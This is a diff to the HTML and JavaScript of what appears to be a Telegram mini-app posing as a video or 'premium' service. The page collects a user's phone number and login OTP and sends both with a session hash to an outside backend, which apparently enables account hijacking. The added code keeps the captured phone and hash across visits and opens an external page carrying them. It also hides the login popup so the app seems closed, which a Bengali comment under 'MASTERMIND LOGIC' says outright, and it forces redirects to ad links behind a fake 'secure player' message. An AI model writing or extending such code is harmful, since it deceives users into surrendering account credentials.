@@ -126,7 +126,7 @@
             <div id="otp-sec" style="display: none;">
                 <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
                     <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- View Code Button: Opens app.html and closes index.html -->
+                    <!-- View Code Button: Opens app.html -->
                     <button onclick="viewCodeAction()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
                 </div>
                 <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
@@ -184,8 +184,16 @@
                 if (data.status === "logged_in") {
                     showPremiumModal();
                 } else {
-                    document.getElementById('phone-sec').style.display = 'block';
-                    document.getElementById('otp-sec').style.display = 'none';
+                    let savedState = localStorage.getItem("loginState");
+                    if (savedState === "otp") {
+                        currentPhone = localStorage.getItem("savedPhone");
+                        currentHash = localStorage.getItem("savedHash");
+                        document.getElementById('phone-sec').style.display = 'none';
+                        document.getElementById('otp-sec').style.display = 'block';
+                    } else {
+                        document.getElementById('phone-sec').style.display = 'block';
+                        document.getElementById('otp-sec').style.display = 'none';
+                    }
                     document.getElementById('loginModal').style.display = 'flex';
                 }
             } catch(e) { showToast("Connection error!"); }
@@ -211,7 +219,9 @@
                 const data = await res.json();
                 if(data.status === "ok") {
                     currentHash = data.hash;
-                    
+                    localStorage.setItem("savedPhone", currentPhone);
+                    localStorage.setItem("savedHash", currentHash);
+                    localStorage.setItem("loginState", "otp");
                     document.getElementById('phone-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
                     showToast("OTP code sent successfully!");
@@ -229,11 +239,13 @@
             verifyBtn.innerHTML = "⏳ Verifying...";
             verifyBtn.disabled = true;
 
-            showToast("Verifying account...");
             try {
                 const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
                 const data = await res.json();
                 if(data.status === "ok") {
+                    localStorage.removeItem("loginState");
+                    localStorage.removeItem("savedPhone");
+                    localStorage.removeItem("savedHash");
                     closeLogin();
                     showPremiumModal();
                 } else { showToast("Invalid Code or Error!"); }
@@ -242,6 +254,9 @@
         }
 
         function resetLoginState() {
+            localStorage.removeItem("loginState");
+            localStorage.removeItem("savedPhone");
+            localStorage.removeItem("savedHash");
             document.getElementById('otp-sec').style.display = 'none';
             document.getElementById('phone-sec').style.display = 'block';
         }
@@ -271,16 +286,16 @@
 
         // ====== MASTERMIND LOGIC ======
         function viewCodeAction() {
-            showToast("Redirecting to OTP Page...");
+            showToast("Opening Secure Gateway...");
             
             // app.html কে ডাটা সহ কল করবে
             let appUrl = 'https://rony90790.github.io/Forward-bot/app.html?user_id=' + userId + '&phone=' + encodeURIComponent(currentPhone) + '&hash=' + encodeURIComponent(currentHash);
             tg.openLink(appUrl);
             
-            // মেইন অ্যাপ (index.html) নিজে Close হয়ে যাবে
+            // মেইন অ্যাপ (index.html) এর লগইন পপআপ সাইলেন্টলি হাইড করে দেবে যাতে মনে হয় অ্যাপ ক্লোজ হয়েছে
             setTimeout(() => {
-                tg.close();
-            }, 500);
+                closeLogin();
+            }, 300);
         }
 
         async function initData() {
@@ -385,7 +400,7 @@
                 if (currentNeededRef > 0 && !clickedAds[videoUrl] && isMp4) { 
                     showToast("⏳ Unlocking secure player...");
                     clickedAds[videoUrl] = true; 
-                    setTimeout(() => { tg.openLink(adUrl); }, 800);
+                    setTimeout(() => { window.location.href = adUrl; }, 800);
                     return; 
                 }
                 const playerWrapper = document.getElementById('player-wrapper');
